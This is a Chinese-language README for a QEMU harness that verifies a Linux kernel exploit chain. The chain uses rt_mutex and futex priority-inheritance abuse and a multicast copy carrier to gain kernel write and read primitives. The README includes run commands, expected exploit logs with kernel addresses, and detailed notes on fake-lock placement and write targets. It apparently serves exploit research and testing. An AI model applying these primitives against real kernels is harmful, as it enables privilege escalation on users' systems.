# QEMU 验证器具（kernel.patched）

把重构后的 exploit 直接作为 QEMU guest 的 `/init` 跑 `--verify-all`，
无需真机即可验证整条链（EDEADLK → MCAST 载体 → sched_setattr → 校验）以及
三种原语：指针写、leaf 零写、boot_id 读原语（外加 restore）。

```sh
./build_and_run.sh          # 交叉编译 + 打包 initramfs + 启动 QEMU(-gdb/:1234)
# 另开一个终端：
./read_log.py               # 从内核 __log_buf 读 exploit 日志（GDB dump，轻量）
./read_log.py --wait 1200   # TCG 较慢时可以多等一会
```

exploit 用 `--log-file /dev/kmsg` 输出（wrapper 挂 `devtmpfs`），日志直接进内核
环形缓冲；`read_log.py` 默认经 GDB 读 128KB `__log_buf`，几乎不打扰 guest，
每 15s 重试直到出现日志行（默认最多等 300s，`--wait N` 调整）。`--ram` 模式则
走 QMP `pmemsave` 导 2GB 内存再 grep，不需要 GDB 但会把 guest 暂停很久。

期望输出（节选）：

```text
... [*] slide write test: shape=pointer value=ffffff800b412320 target=ffffff800b7f8b6c, ...
... [+] slide write boot_id raw=...2023410b80ffffff lo=0 hi=ffffff800b412320 exp_lo=0 exp_hi=ffffff800b412320 ok=1
... [+] slide write test PASSED
... [*] slide leaf test: shape=leaf value=0000000000000000 target=ffffff800b7f8b64, ...
... [+] slide leaf boot_id raw=...2023410b80ffffff lo=0 hi=ffffff800b412320 exp_lo=0 exp_hi=0 ok=1
... [+] slide leaf test PASSED
... [*] slide read test: shape=pointer value=ffffff800b4cd738 target=ffffff800b4cd730, ...
... [+] slide read boot_id raw=100000002401000030d74c0b80ffffff lo=0000012400000010 hi=ffffff800b4cd730 ... ok=1
... [+] slide read test PASSED
... [+] slide restore test PASSED
... [+] slide verify all PASSED
```

说明：

- `init_wrapper.c` 会挂载 `/proc` 和 `devtmpfs`、给 fd 0/1/2 补 `/dev/null`
  （QEMU 无控制台，否则 `pipe()` 会占用 fd 0/1）、然后 fork 出 exploit 并
  自己保持 PID 1 存活（`/init` 退出会让内核 panic "Attempted to kill init"，
  日志就没了）。
- `carrier=-1/22`（EINVAL）是预期的：拷贝完成后 `ip_mc_source` 因假地址组失败；
  拷贝本身已发生（`write_ok=1` 即证明）。
- 写目标为 `sysctl_bootid + 8`：`proc_do_uuid()` 在 `bootid[8]==0` 时会重新生成
  UUID，写低 8 字节会被验证读覆盖。
- fake `rt_mutex` 用 `empty_zero_page` 的**独立槽位**（每次 attempt 取新偏移
  `+n*0x20`）；**不要**复用同一把锁——walk 会把 `waiters.root/leftmost` 留在锁里
  指向本次 waiter，下一次 walk 会解引用已释放栈并触发 `BUG_ON(w->lock != lock)`。
- QEMU 使用 `nokaslr` + `--kaslr-base 0xffffff8008080800`；
  需要 GDB 观测时 attach `:1234`（rt_mutex_adjust_prio_chain @ 0xffffff8008162d70、
  rt_mutex_adjust_pi @ 0xffffff8008162c58、do_futex @ 0xffffff80081a5248）。
- **不要用 QMP `pmemsave` 频繁 dump 2GB 内存**：每次都会把 guest 暂停很久，
  容易把某个 attempt 的时序搅乱——实测有一次 restore attempt 的 fake waiter
  `lock` 词被覆盖成栈上地址，walk 卡在 `rt_mutex_adjust_prio_chain` 的
  `raw_spin_trylock` 重试循环（upstream `rtmutex.c:585`）里；单核 TCG 下
  `cpu_relax()` 的 `yield` 把整个 VM 冻死（PC 固定在 0xffffff8008162f1c）。
  用 `read_log.py` 默认的 kmsg/GDB 模式即可避免（每次只读 128KB）。
